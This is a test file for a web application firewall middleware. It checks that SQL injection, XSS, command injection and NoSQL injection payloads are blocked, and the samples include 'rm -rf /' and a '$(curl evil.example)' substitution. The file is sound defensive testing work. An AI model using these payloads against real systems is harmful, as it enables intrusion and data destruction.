import { test } from "node:test";
import assert from "node:assert/strict";
import { z } from "zod";
import { App, waf } from "../src/index.js";
import type { WafEvent, WafOptions } from "../src/index.js";

// ---------- app fixtures ----------

function bodyApp(opts?: WafOptions) {
  const app = new App({ env: "development", logger: false });
  app.use(waf(opts));
  app.route({
    method: "POST",
    path: "/echo",
    operationId: "echo",
    request: { body: z.object({ value: z.string() }).strict() },
    responses: {
      200: { description: "ok", body: z.object({ value: z.string() }) },
    },
    handler: ({ body }) => ({
      status: 200 as const,
      body: body as { value: string },
    }),
  });
  return app;
}

function queryApp(opts?: WafOptions) {
  const app = new App({ env: "development", logger: false });
  app.use(waf(opts));
  app.route({
    method: "GET",
    path: "/search",
    operationId: "search",
    responses: { 200: { description: "ok", body: z.object({ ok: z.boolean() }) } },
    handler: () => ({ status: 200 as const, body: { ok: true } }),
  });
  return app;
}

function nosqlApp(opts?: WafOptions) {
  const app = new App({ env: "development", logger: false });
  app.use(waf(opts));
  app.route({
    method: "POST",
    path: "/login",
    operationId: "login",
    // Permissive body schema so a `$ne` operator object survives validation.
    request: { body: z.object({ username: z.string(), password: z.any() }) },
    responses: { 200: { description: "ok", body: z.object({ ok: z.boolean() }) } },
    handler: () => ({ status: 200 as const, body: { ok: true } }),
  });
  return app;
}

function jsonRequest(path: string, body: unknown): Request {
  return new Request(`http://x${path}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
}

// ---------- construction validation (unhappy paths) ----------

test("waf() rejects an invalid mode", () => {
  assert.throws(() => waf({ mode: "audit" as never }), /mode/);
});

test("waf() rejects a non-positive blockThreshold", () => {
  assert.throws(() => waf({ blockThreshold: 0 }), /blockThreshold/);
  assert.throws(() => waf({ blockThreshold: -3 }), /blockThreshold/);
  assert.throws(() => waf({ blockThreshold: Number.NaN }), /blockThreshold/);
});

test("waf() rejects non-positive-integer caps", () => {
  assert.throws(() => waf({ maxValueLength: 0 }), /maxValueLength/);
  assert.throws(() => waf({ maxValueLength: 1.5 }), /maxValueLength/);
  assert.throws(() => waf({ maxBodyNodes: -1 }), /maxBodyNodes/);
});

test("waf() rejects a non-positive per-rule score override", () => {
  assert.throws(() => waf({ rules: { sqli: { score: 0 } } }), /rules\.sqli\.score/);
  assert.throws(
    () => waf({ rules: { xss: { score: -2 } } }),
    /rules\.xss\.score/,
  );
});

// ---------- clean requests pass untouched (happy paths) ----------

test("clean body request passes through", async () => {
  const app = bodyApp();
  const res = await app.fetch(jsonRequest("/echo", { value: "hello world" }));
  assert.equal(res.status, 200);
  assert.deepEqual(await res.json(), { value: "hello world" });
});

test("clean query request passes through", async () => {
  const app = queryApp();
  const res = await app.fetch(new Request("http://x/search?q=typescript+books"));
  assert.equal(res.status, 200);
  assert.deepEqual(await res.json(), { ok: true });
});

// ---------- SQLi rule ----------

test("SQLi in query is blocked with a generic 403", async () => {
  const app = queryApp();
  const res = await app.fetch(
    new Request("http://x/search?q=" + encodeURIComponent("1' OR '1'='1")),
  );
  assert.equal(res.status, 403);
  const problem = (await res.json()) as { detail?: string };
  // Generic detail — never names the rule that fired.
  assert.equal(problem.detail, "Request blocked by security policy");
});

test("UNION SELECT in body is blocked", async () => {
  const app = bodyApp();
  const res = await app.fetch(
    jsonRequest("/echo", { value: "x UNION SELECT password FROM users" }),
  );
  assert.equal(res.status, 403);
});

// ---------- XSS rule ----------

test("XSS script tag in body is blocked", async () => {
  const app = bodyApp();
  const res = await app.fetch(
    jsonRequest("/echo", { value: "<script>alert(1)</script>" }),
  );
  assert.equal(res.status, 403);
});

test("XSS event handler in query is blocked", async () => {
  const app = queryApp();
  const res = await app.fetch(
    new Request(
      "http://x/search?q=" + encodeURIComponent('"><img src=x onerror=alert(1)>'),
    ),
  );
  assert.equal(res.status, 403);
});

// ---------- command-injection rule ----------

test("command injection in body is blocked", async () => {
  const app = bodyApp();
  const res = await app.fetch(jsonRequest("/echo", { value: "file.txt; rm -rf /" }));
  assert.equal(res.status, 403);
});

test("command substitution in query is blocked", async () => {
  const app = queryApp();
  const res = await app.fetch(
    new Request("http://x/search?q=" + encodeURIComponent("$(curl evil.example)")),
  );
  assert.equal(res.status, 403);
});

// ---------- NoSQLi rule ----------

test("NoSQL operator object in body is blocked structurally", async () => {
  const app = nosqlApp();
  const res = await app.fetch(
    jsonRequest("/login", { username: "admin", password: { $ne: null } }),
  );
  assert.equal(res.status, 403);
});

test("NoSQL operator string in query is blocked", async () => {
  const app = queryApp();
  const res = await app.fetch(
    new Request("http://x/search?filter=" + encodeURIComponent('{"$where": "1"}')),
  );
  assert.equal(res.status, 403);
});

// ---------- log mode ----------

test("log mode never blocks but reports via onMatch", async () => {
  const events: WafEvent[] = [];
  const app = bodyApp({ mode: "log", onMatch: (e) => events.push(e) });
  const res = await app.fetch(
    jsonRequest("/echo", { value: "<script>alert(1)</script>" }),
  );
  assert.equal(res.status, 200);
  assert.equal(events.length, 1);
  assert.equal(events[0]!.action, "logged");
  assert.equal(events[0]!.mode, "log");
  assert.equal(events[0]!.method, "POST");
  assert.equal(events[0]!.path, "/echo");
  assert.ok(events[0]!.matches.some((m) => m.ruleId === "xss"));
  assert.ok(events[0]!.score >= events[0]!.threshold);
});

test("block mode fires onMatch with action 'blocked'", async () => {
  const events: WafEvent[] = [];
  const app = queryApp({ onMatch: (e) => events.push(e) });
  const res = await app.fetch(
    new Request("http://x/search?q=" + encodeURIComponent("1 OR 1=1")),
  );
  assert.equal(res.status, 403);
  assert.equal(events.length, 1);
  assert.equal(events[0]!.action, "blocked");
  assert.equal(events[0]!.matches[0]!.location, "query");
});

// ---------- per-rule enable/disable ----------

test("disabling a rule lets its payload through", async () => {
  const app = bodyApp({ rules: { xss: false } });
  const res = await app.fetch(
    jsonRequest("/echo", { value: "<script>alert(1)</script>" }),
  );
  assert.equal(res.status, 200);
});

test("disabling one rule still enforces the others", async () => {
  const app = bodyApp({ rules: { xss: false } });
  const res = await app.fetch(
    jsonRequest("/echo", { value: "x UNION SELECT secret FROM accounts" }),
  );
  assert.equal(res.status, 403);
});

// ---------- threshold scoring ----------

test("raised threshold requires two rule categories to fire", async () => {
  // Each rule scores 5; threshold 8 needs two categories (10) to trip.
  const app = bodyApp({ blockThreshold: 8 });
  // Single-category SQLi (score 5) passes under the raised threshold.
  const single = await app.fetch(
    jsonRequest("/echo", { value: "x UNION SELECT a FROM b" }),
  );
  assert.equal(single.status, 200);
  // SQLi + XSS together (10) trips it.
  const combined = await app.fetch(
    jsonRequest("/echo", {
      value: "x UNION SELECT a FROM b <script>alert(1)</script>",
    }),
  );
  assert.equal(combined.status, 403);
});

test("custom per-rule score is honored in scoring", async () => {
  const events: WafEvent[] = [];
  const app = queryApp({
    rules: { sqli: { score: 9 } },
    onMatch: (e) => events.push(e),
  });
  const res = await app.fetch(
    new Request("http://x/search?q=" + encodeURIComponent("1 OR 1=1")),
  );
  assert.equal(res.status, 403);
  assert.equal(events[0]!.score, 9);
});

// ---------- inspection scoping ----------

test("body-only inspection ignores a malicious query", async () => {
  const app = queryApp({ inspect: { query: false, path: false, body: false } });
  const res = await app.fetch(
    new Request("http://x/search?q=" + encodeURIComponent("1' OR '1'='1")),
  );
  assert.equal(res.status, 200);
});

test("query inspection catches an encoded payload after decoding", async () => {
  const app = queryApp();
  // Double-encoded single quote + OR tautology.
  const res = await app.fetch(
    new Request("http://x/search?q=%27%20OR%201%3D1"),
  );
  assert.equal(res.status, 403);
});

// ---------- header inspection (opt-in) ----------

test("headers are not inspected unless an allowlist is provided", async () => {
  const app = queryApp();
  const res = await app.fetch(
    new Request("http://x/search", {
      headers: { referer: "<script>alert(1)</script>" },
    }),
  );
  assert.equal(res.status, 200);
});

test("allowlisted header is inspected and blocked", async () => {
  const app = queryApp({ inspect: { headers: ["referer"] } });
  const res = await app.fetch(
    new Request("http://x/search", {
      headers: { referer: "<script>alert(1)</script>" },
    }),
  );
  assert.equal(res.status, 403);
});

// ---------- path inspection ----------

test("malicious path segment is blocked", async () => {
  const app = new App({ env: "development", logger: false });
  app.use(waf());
  app.route({
    method: "GET",
    path: "/files/:name",
    operationId: "getFile",
    responses: { 200: { description: "ok", body: z.object({ ok: z.boolean() }) } },
    handler: () => ({ status: 200 as const, body: { ok: true } }),
  });
  const res = await app.fetch(
    new Request("http://x/files/" + encodeURIComponent("1' OR '1'='1")),
  );
  // SQLi tautology signature fires on the decoded path segment.
  assert.equal(res.status, 403);
});

// ---------- bounded scanning ----------

test("oversized body string is truncated but still scanned at the prefix", async () => {
  const app = bodyApp({ maxValueLength: 32 });
  const payload = "<script>alert(1)</script>" + "A".repeat(5000);
  const res = await app.fetch(jsonRequest("/echo", { value: payload }));
  assert.equal(res.status, 403);
});

test("no inspection work when all rules disabled", async () => {
  const app = bodyApp({
    rules: { sqli: false, xss: false, nosqli: false, cmdi: false },
  });
  const res = await app.fetch(
    jsonRequest("/echo", { value: "<script>alert(1)</script>" }),
  );
  assert.equal(res.status, 200);
});
